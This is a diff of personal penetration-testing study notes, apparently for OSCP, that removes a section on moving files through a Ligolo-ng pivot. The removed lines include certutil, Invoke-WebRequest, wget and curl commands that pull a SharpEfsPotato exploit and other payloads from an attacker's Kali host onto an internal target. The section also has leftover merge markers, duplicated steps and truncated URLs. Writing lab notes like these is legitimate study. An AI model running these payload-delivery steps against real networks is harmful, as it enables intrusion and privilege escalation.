@@ -1,8 +1,7 @@
-add link for port 1234 on MS01 to connect to KALI 80
-listener_add --addr 0.0.0.0:1234 --to 127.0.0.1:80
+[[Sending payload reverse direction through ligolo pivot]]
+
 Listener_list
 Listener_stop
-
 
 KILL LIGOLO
 ```
@@ -212,88 +211,4 @@ If ping works → pivot is **fully functional** ✅
 
 ---
 
-# Transfer Files through Ligolo
 
-### Step 1: Start your file server on Kali 
-
-On KALI ATTACKER
-=======
-### Step 1: Start your file server on Kali (`1.1.1.1`)
-
-Host the file on your attacker machine using Python's built-in HTTP server on a port of your choice (e.g., `80`).
-
-```
-python3 -m http.server 80
-```
-
-### Step 2: Set up a Listener in the Ligolo Proxy Console
-
-On Kali machine, jump into your active Ligolo proxy session (the session handling the `2.2.2.2` agent) and tell it to forward traffic from `2.2.2.2` back to your Kali server.
-=======
-Use code with caution.
-
-### Step 2: Set up a Listener in the Ligolo Proxy Console
-
-On your Kali machine, jump into your active Ligolo proxy session (the session handling the `2.2.2.2` agent) and tell it to forward traffic from `2.2.2.2` back to your Kali server.
-
-1. In the Ligolo-ng proxy interface, make sure you are interacting with the session for `2.2.2.2`.
-2. Run the `listener_add` command:
-
-ligolo-ng >> 
-```
-listener_add --addr 0.0.0.0:1234 --to 127.0.0.1:80
-```
-
-
-```
-ligolo-ng » listener_add --addr 0.0.0.0:1234 --to 127.0.0.1:80
-```
-
-- **What this does:** This tells the agent running on `2.2.2.2` to listen on port `1234` on all its interfaces. Any traffic hitting `2.2.2.2:1234` will be automatically encrypted and forwarded through the tunnel back to port `80` on your Kali machine (`1.1.1.1`).
-
-### Step 3: Download the file from the Internal Host (`3.3.3.3`)
-
-ON TARGET or terminal session on `3.3.3.3`. Instead of requesting the file from `1.1.1.1` (which it cannot reach), **request the file from `2.2.2.2` on the listener port (`1234`)**.
-
-Depending on the operating system of `3.3.3.3`, use one of the following commands:
-
-Windows (PowerShell):**
-```dataviewjs
-const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";
-
-const command = `certutil.exe -f -urlcache -split http://${KaliIP}:1234/SharpEfsPotato.exe SharpEfsPotato.exe`;
-
-dv.paragraph("```bash\n" + command + "\n```");
-```
-
-```
-Invoke-WebRequest -Uri "http://2.2.2" -OutFile "C:\Windows\Temp\yourfile.exe"
-```
-
-```
-iwr -uri "http://2.2.2" -outfile "C:\Windows\Temp\yourfile.exe"
-```
-
-Now, switch to your Evil-WinRM shell or terminal session on `3.3.3.3`. Instead of requesting the file from `1.1.1.1` (which it cannot reach), **request the file from `2.2.2.2` on the listener port (`1234`)**.
-
-Depending on the operating system of `3.3.3.3`, use one of the following commands:
-
-- **If `3.3.3.3` is Windows (PowerShell):**
-    
-    powershell
-    
-    ```
-    Invoke-WebRequest -Uri "http://2.2.2" -OutFile "C:\Windows\Temp\yourfile.exe"
-    # Or the shorter alias:
-    iwr -uri "http://2.2.2" -outfile "C:\Windows\Temp\yourfile.exe"
-    ```
-    
-    Use code with caution.
-    
-- **If `3.3.3.3` is Linux:**
- 
-    ```
-    wget http://2.2.2
-    # Or
-    curl -O http://2.2.2
-    ```
